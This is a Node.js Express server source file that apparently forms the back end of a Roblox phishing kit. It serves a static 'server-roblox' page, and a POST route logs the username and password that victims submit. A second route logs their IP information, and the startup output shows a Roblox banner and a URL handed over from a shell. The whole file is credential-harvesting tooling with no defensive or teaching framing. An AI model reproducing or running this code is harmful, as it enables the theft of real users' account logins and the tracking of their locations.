const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const CFonts = require('cfonts');
const { exec } = require('child_process');
const app = express();
const port = 8080;

app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'server-roblox')));

app.post('/server-roblox', (req, res) => {
    const { idusername, idpass } = req.body;
    console.log(`\nLogin Info: {\n  Username: ${idusername},\n  Password: ${idpass}\n}`);
    res.sendStatus(200);
});

app.post('/ipinfo', (req, res) => {
    const ipInfo = req.body;
    console.log(`\nIP Info:`, ipInfo);
    res.sendStatus(200);
});

CFonts.say('Roblox', {
    font: 'pallet',              
    align: 'left',             
    colors: ['yellowBright', 'white'], 
    background: 'black',        
    letterSpacing: 1,          
    lineHeight: 1,              
    space: true,                
    maxLength: '0',     
});


function checkLocalServer(url) {
    return new Promise((resolve, reject) => {
        const http = require('http');
        http.get(url, (resp) => {
            resolve(true);
        }).on('error', (err) => {
            reject(false);
        });
    });
}

const send_url = process.argv[2]; 

app.listen(port, () => {
    console.log('Server connected!')
    console.log(`Server is running on http://localhost:${port}`);
    console.log(`URL recebida do shell: ${send_url}`);
});
